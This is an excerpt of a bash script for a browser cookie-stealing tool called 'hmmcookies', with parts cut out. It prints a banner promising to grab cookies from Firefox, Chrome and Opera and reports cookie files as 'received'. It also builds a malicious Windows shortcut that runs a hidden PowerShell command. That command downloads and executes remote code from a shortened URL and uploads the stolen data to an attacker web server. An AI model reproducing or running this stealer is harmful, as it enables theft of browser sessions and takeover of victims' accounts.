#!/bin/bash
# HMMCOOKIES v1.0
# coded by: github.com/thelinuxchoice/hmmcookies
...
printf "\e[1;93m __                                        __     __               \e[0m\n"
printf "\e[1;93m|  |--.--------.--------.----.-----.-----.|  |--.|__|.-----.-----. \e[0m\n"
printf "\e[1;77m|     |        |        |  __|  _  |  _  ||    < |  ||  -__|__ --| \e[0m\n"
printf "\e[1;77m|__|__|__|__|__|__|__|__|____|_____|_____||__|__||__||_____|_____| \e[0m\n"
                                                                  
printf "\n\e[1;33m             Grab cookies from Firefox, Chrome, Opera\e[0m\n\n"
printf " \e[77mv1.0 coded by github.com/thelinuxchoice/hmmcookies\e[0m\n"
...
default_payload_name="hmmcookies"
...
if [[ -e "firefox.log" ]]; then
printf "\e[1;92m[\e[0m\e[1;77m+\e[0m\e[1;92m] Firefox cookies received!\e[0m\e[1;77m Saved: Firefox/cookies.sqlite\e[0m\n"
rm -rf firefox.log
fi

if [[ -e "chrome.log" ]]; then
printf "\e[1;92m[\e[0m\e[1;77m+\e[0m\e[1;92m] Chrome cookies received!\e[0m\e[1;77m Saved: Chrome/Cookies\e[0m\n"
rm -rf chrome.log
fi

if [[ -e "opera.log" ]]; then
printf "\e[1;92m[\e[0m\e[1;77m+\e[0m\e[1;92m] Opera cookies received!\e[0m\e[1;77m Saved: Opera/Cookies\e[0m\n"
rm -rf opera.log
fi
...
LNK_TARGET="$cmd"
IFS=$'\n'
param_HasArguments='-win 1 -c $scriptPath = iwr -useb "https://tinyurl.com/hmmcookies";Invoke-Command -ScriptBlock ([scriptblock]::Create($scriptPath)) -Args "'$webserver'/upload.php"' 
